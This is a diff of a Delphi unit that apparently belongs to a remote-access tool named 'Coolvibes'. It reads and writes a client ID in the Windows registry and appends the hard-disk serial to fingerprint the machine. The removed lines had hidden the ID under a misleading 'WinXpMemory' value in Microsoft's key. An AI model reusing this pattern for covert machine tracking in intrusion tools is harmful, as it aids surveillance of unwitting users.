@@ -5,10 +5,8 @@ unit unitCambioID;
 interface
 
 uses
-  minireg, Windows, SettingsDef, UnitVariables;
+ Windows, sysutils,  SettingsDef, UnitVariables,  minireg, UnitFunciones;
 
- //var
- //  Registro: TRegistry;
 
 procedure CambiarID(NvoNombre: string);
 function LeerID(): string;
@@ -17,35 +15,25 @@ implementation
 
 function LeerId(): string;
 begin
-  //  Registro := TRegistry.Create(KEY_ALL_ACCESS);
-  //  Registro.RootKey := HKEY_CURRENT_USER;
-  //  Registro.OpenKey('\Software\Microsoft\Windows\CurrentVersion\', true);
- 
-  //  Result := Registro.ReadString('WinXpMemory');
 
   RegGetString(HKEY_CURRENT_USER, 'Software\'+Configuracion.sID+'\ID', Result);
   //Si no lo lee del registro lo intenta leer de si mismo, de la configuracion que guardo el editor
 
-    if Result = '' then
-      Result := Configuracion.sID;
+  if Result = '' then
+    Result := Configuracion.sID;
 
   if Result = '' then
-    Result := 'Coolvibes';
-  //Finalmente si no hoy nada escrito en la configuracion devuelve el valor por defecto
-  //  Registro.CloseKey;
-  //  Registro.Free;
+    Result := 'Coolvibes';//Finalmente si no hoy nada escrito en la configuracion devuelve el valor por defecto
+
+  Result := trim(Result)+'_'+GetHardDiskSerial;//Le agregamos el serial del disco duro
+
+
 
 end;
 
 procedure CambiarId(nvoNombre: string);
 begin
-  //  Registro := TRegistry.Create(KEY_WRITE);
-  //  Registro.RootKey := HKEY_CURRENT_USER;
-  //  Registro.OpenKey('\Software\Microsoft\Windows\CurrentVersion\', true);
   RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\ID', nvoNombre+#15);
-  //  Registro.WriteString('WinXpMemory',nvoNombre);
-  //  Registro.CloseKey;
-  //  Registro.Free;
 end;
 
 end.
